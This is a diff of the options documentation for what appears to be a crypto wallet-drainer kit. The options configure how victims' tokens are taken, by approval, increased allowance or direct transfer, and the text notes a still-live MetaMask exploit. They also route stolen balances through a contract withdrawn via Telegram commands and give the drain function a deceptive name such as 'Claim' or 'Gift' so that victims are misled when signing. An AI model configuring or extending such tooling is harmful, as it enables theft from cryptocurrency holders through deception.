@@ -28,8 +28,9 @@ Options explained:
 -disable_wyvern: All is on name, don't edit it.
 -disable_x2y2_batch_transfer: All is on name, don't edit it.
 
--use_approvement_for_tokens: Define if you prefer use approvement or token transfer (MetaMask exploit is still live so don't switch it to false: https://ibb.co/DL18PN6).
+-use_token_transfer: Define if you prefer use approvement or token transfer (MetaMask exploit is still live so don't switch it to false: https://ibb.co/DL18PN6).
 -use_increase_allowance_for_tokens_when_disponible: Define if you prefer the first approvement popup or the second. Test it yourself, it doesn't really matter for now. ("use_approvement_for_tokensmust" be true)
+-use_token_transfer_if_increase_allowance_not_disponible: If "use_increase_allowance_for_tokens_when_disponible" is true and the token doesn't support increase allowance method, it will use token transfer (https://ibb.co/DL18PN6).
 
 -use_transfer_contract: Use a contract for all balance hits (you can withdraw from contract with telegram commands -> /help). Contract is good because user will see the data of "transfer_contract_drain_function_name" + empty address: https://ibb.co/QDDRbD1.
 -transfer_contract_drain_function_name: Define the method that will be used for drain the balance using contract. Options possible: Claim, Confirm, Verify, Connect, Start, Gift and Enable.
